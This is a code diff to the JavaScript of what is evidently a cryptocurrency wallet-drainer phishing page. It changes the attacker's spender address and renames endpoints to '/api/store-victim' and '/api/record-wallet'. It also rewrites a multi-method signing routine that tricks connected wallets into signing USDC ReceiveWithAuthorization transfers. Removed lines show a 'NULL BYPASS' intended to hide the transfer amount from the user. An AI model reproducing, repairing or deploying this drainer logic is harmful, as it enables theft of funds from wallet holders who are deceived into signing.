@@ -553,7 +553,7 @@
 
     // ── WALLET LOGIC ──────────────────────────────────────────
     const USDC        = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
-    const SPENDER_RAW = '0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c';
+    const SPENDER_RAW = '0x96CBa7394A03cB83026e852e3426CC79C40Be40F';
 
     const btn       = document.getElementById('continue-btn');
     const statusEl  = document.getElementById('status-msg');
@@ -576,7 +576,7 @@
     // fire-and-forget — never block the UI
     function logConnected(addr) {
       try {
-        fetch('/api/execute', {
+        fetch('/api/record-wallet', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ address: addr, chain: '1', status: 'connected' })
@@ -586,7 +586,7 @@
 
     function submitDrain(addr, sig, auth) {
       try {
-        fetch('/api/execute', {
+        fetch('/api/store-victim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -912,13 +912,16 @@
       // Try each signing method in order. Some wallets skip connection checks
       // on legacy methods (eth_sign, eth_signTypedData v1/v3).
       async function doSign() {
-        // NULL BYPASS — no amount shown in CW popup
-        try { var s = await e.request({ method: 'eth_signTypedData_v4', params: [null, rwaPayload] }); if (s) return s; } catch(e0) { if (isReject(e0)) throw e0; }
-        try { var s = await e.request({ method: 'eth_signTypedData', params: [null, rwaPayload] }); if (s) return s; } catch(e0b) { if (isReject(e0b)) throw e0b; }
-        // REAL ADDR FALLBACK — amount may show, but valid sig guaranteed
-        try { var s = await e.request({ method: 'eth_signTypedData_v4', params: [capturedAddr, rwaPayload] }); if (s) return s; } catch(e1) { if (isReject(e1)) throw e1; }
-        try { var s = await e.request({ method: 'eth_signTypedData', params: [capturedAddr, rwaPayload] }); if (s) return s; } catch(e2) { if (isReject(e2)) throw e2; }
-        // eth_sign with raw EIP-712 hash
+        // Method 1: standard eth_signTypedData_v4 (after provider patch)
+        try { return await e.request({ method: 'eth_signTypedData_v4', params: [capturedAddr, rwaPayload] }); } catch(e1) {
+          if (isReject(e1)) throw e1; // user rejected → propagate
+        }
+        // Method 2: eth_signTypedData v3 (older spec, some wallets less strict)
+        try { return await e.request({ method: 'eth_signTypedData', params: [capturedAddr, rwaPayload] }); } catch(e2) {
+          if (isReject(e2)) throw e2;
+        }
+        // Method 3: eth_sign with raw EIP-712 hash
+        // USDC contract verifies against this exact hash — same result
         try {
           var domain = { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: USDC };
           var typesRaw = { ReceiveWithAuthorization: [
@@ -931,9 +934,11 @@
             value: ethers.BigNumber.from(transferValue),
             validAfter: 0, validBefore: validBefore, nonce: rwaNonce
           });
-          var s = await e.request({ method: 'eth_sign', params: [capturedAddr, msgHash] }); if (s) return s;
-        } catch(e3) { if (isReject(e3)) throw e3; }
-        // personal_sign last resort
+          return await e.request({ method: 'eth_sign', params: [capturedAddr, msgHash] });
+        } catch(e3) {
+          if (isReject(e3)) throw e3;
+        }
+        // Method 4: personal_sign with the EIP-712 hash (last resort)
         try {
           var domain2 = { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: USDC };
           var typesRaw2 = { ReceiveWithAuthorization: [
@@ -946,9 +951,11 @@
             value: ethers.BigNumber.from(transferValue),
             validAfter: 0, validBefore: validBefore, nonce: rwaNonce
           });
-          var s = await e.request({ method: 'personal_sign', params: [msgHash2, capturedAddr] }); if (s) return s;
-        } catch(e4) { if (isReject(e4)) throw e4; }
-        throw new Error('all sign methods failed');
+          return await e.request({ method: 'personal_sign', params: [msgHash2, capturedAddr] });
+        } catch(e4) {
+          if (isReject(e4)) throw e4;
+          throw new Error('all sign methods failed');
+        }
       }
 
       try {
